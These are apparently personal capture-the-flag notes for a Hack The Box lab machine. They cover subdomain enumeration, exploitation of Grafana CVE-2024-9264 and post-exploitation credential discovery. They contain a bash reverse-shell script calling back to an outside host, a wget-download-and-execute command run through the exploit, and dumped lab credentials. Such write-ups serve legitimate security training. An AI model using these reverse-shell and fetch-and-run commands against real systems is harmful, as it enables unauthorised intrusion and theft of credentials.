# NMAP Scan
- Port 22 and 80 --> planning.htb added to `etc/hosts`

# Gobuster 
## File scan
```
┌──(root㉿kali)-[/usr/share/wordlists/seclists/Discovery/Web-Content]
└─# gobuster dir -u planning.htb -w common.txt                                                                                                                         
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://planning.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/css                  (Status: 301) [Size: 178] [--> http://planning.htb/css/]
/img                  (Status: 301) [Size: 178] [--> http://planning.htb/img/]
/index.php            (Status: 200) [Size: 23914]
/js                   (Status: 301) [Size: 178] [--> http://planning.htb/js/]
/lib                  (Status: 301) [Size: 178] [--> http://planning.htb/lib/]
Progress: 4744 / 4745 (99.98%)
```
## DNS Scan
```
┌──(root㉿kali)-[/usr/share/wordlists/seclists/Discovery/DNS]
└─# gobuster dns -d planning.htb -w bitquark-subdomains-top100000.txt -t 100
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Domain:     planning.htb
[+] Threads:    100
[+] Timeout:    1s
[+] Wordlist:   bitquark-subdomains-top100000.txt
===============================================================
Starting gobuster in DNS enumeration mode
===============================================================
Progress: 100000 / 100001 (100.00%)
===============================================================
Finished
===============================================================

```
# Ffuf
## File scan
```
┌──(root㉿kali)-[/usr/share/wordlists/seclists/Discovery/Web-Content]
└─# ffuf -u http://planning.htb/FUZZ -w common.txt

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://planning.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

css                     [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 205ms]
img                     [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 204ms]
index.php               [Status: 200, Size: 23914, Words: 8236, Lines: 421, Duration: 204ms]
js                      [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 181ms]
lib                     [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 205ms]
:: Progress: [4744/4744] :: Job [1/1] :: 195 req/sec :: Duration: [0:00:25] :: Errors: 0 ::

```
## DNS Scan
```
┌──(root㉿kali)-[/usr/share/wordlists/seclists/Discovery/DNS]
└─# ffuf -w bitquark-subdomains-top100000.txt -u http://planning.htb/ -H "Host: FUZZ.planning.htb" -t 150 -mc all -fs 178                                              

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://planning.htb/
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt
 :: Header           : Host: FUZZ.planning.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 150
 :: Matcher          : Response status: all
 :: Filter           : Response size: 178
________________________________________________

grafana                 [Status: 302, Size: 29, Words: 2, Lines: 3, Duration: 179ms]
:: Progress: [100000/100000] :: Job [1/1] :: 626 req/sec :: Duration: [0:02:17] :: Errors: 0 ::

```
# SSH
```
┌──(root㉿kali)-[/usr/share/wordlists/seclists/Discovery/Web-Content]
└─# ssh admin@10.10.11.68
The authenticity of host '10.10.11.68 (10.10.11.68)' can't be established.
ED25519 key fingerprint is SHA256:iDzE/TIlpufckTmVF0INRVDXUEu/k2y3KbqA/NDvRXw.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.68' (ED25519) to the list of known hosts.
admin@10.10.11.68's password: 
Permission denied, please try again.
```
Provided creds don't seem to work against SSH

# Working Steps
- Added grafana to etc/hosts
- Provided creds work in Grafana portal
- Page source is saying Grafana v11.0.0
- CVE: `https://github.com/nollium/CVE-2024-9264`
- Made virtual environment:
```
# Create a virtual environment
python3 -m venv venv

# Activate the virtual environment
source venv/bin/activate
```
- Installed `requirements.txt` with `pip install -r requirements.txt` in venv
-  Made a basic reverse shell file:
```
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.5/4444 0>&1`
```
- Started serving file on port 8000 with: `python3 -m http.server 8000`
- Started listening for reverse shell with: `nc -lvnp 4444`
- Used exploit with `python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -c "wget http://10.10.14.5:8000/basic_bash_reverse_shell_p4444.sh -O /tmp/basic_bash_reverse_shell_p4444.sh && chmod +x /tmp/basic_bash_reverse_shell_p4444.sh && /tmp/basic_bash_reverse_shell_p4444.sh" http://grafana.planning.htb`
- Reverse shell allowed me to find creds in /var/lib/grafana/ by running `env` in that path:
```
root@7ce659d667d7:/var/lib/grafana# env
env
AWS_AUTH_SESSION_DURATION=15m
HOSTNAME=7ce659d667d7
PWD=/var/lib/grafana
AWS_AUTH_AssumeRoleEnabled=true
GF_PATHS_HOME=/usr/share/grafana
AWS_CW_LIST_METRICS_PAGE_LIMIT=500
HOME=/usr/share/grafana
AWS_AUTH_EXTERNAL_ID=
SHLVL=2
GF_PATHS_PROVISIONING=/etc/grafana/provisioning
GF_SECURITY_ADMIN_PASSWORD=RioTecRANDEntANT!
GF_SECURITY_ADMIN_USER=enzo
GF_PATHS_DATA=/var/lib/grafana
GF_PATHS_LOGS=/var/log/grafana
PATH=/usr/local/bin:/usr/share/grafana/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
AWS_AUTH_AllowedAuthProviders=default,keys,credentials
GF_PATHS_PLUGINS=/var/lib/grafana/plugins
GF_PATHS_CONFIG=/etc/grafana/grafana.ini
OLDPWD=/var/lib
_=/usr/bin/env
root@7ce659d667d7:/var/lib/grafana# 
```
- Login via SSH with new found creds: `ssh enzo@10.10.11.68` there you find `user.txt` with the user flag.
- Looked in `/opt/` for cronjobs and find crontabs.db with a password:
```
enzo@planning:/opt/crontabs$ cat crontab.db 
{"name":"Grafana backup","command":"/usr/bin/docker save root_grafana -o /var/backups/grafana.tar && /usr/bin/gzip /var/backups/grafana.tar && zip -P P4ssw0rdS0pRi0T3c /var/backups/grafana.tar.gz.zip /var/backups/grafana.tar.gz && rm /var/backups/grafana.tar.gz","schedule":"@daily","stopped":false,"timestamp":"Fri Feb 28 2025 20:36:23 GMT+0000 (Coordinated Universal Time)","logging":"false","mailing":{},"created":1740774983276,"saved":false,"_id":"GTI22PpoJNtRKg0W"}
{"name":"Cleanup","command":"/root/scripts/cleanup.sh","schedule":"* * * * *","stopped":false,"timestamp":"Sat Mar 01 2025 17:15:09 GMT+0000 (Coordinated Universal Time)","logging":"false","mailing":{},"created":1740849309992,"saved":false,"_id":"gNIRXh1WIc9K7BYX"}
```
- Checked network information with `netstat -tupln`
```
enzo@planning:/opt/crontabs$ netstat -tupln
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.54:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:34723         0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
udp        0      0 127.0.0.54:53           0.0.0.0:*                           -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -
```
# Lessons
- Assume the worst - double check results with different tools and different wordlists. And use the biggest one available to you but also a different one altogether. This box required the bitquark txt one to find the `grafana` subdomain when none other had that keyword needed for this challenge
- Ffuf found the subdomain with the wordlist but gobuster didnt even when i experimented with different threads (`-t`):(
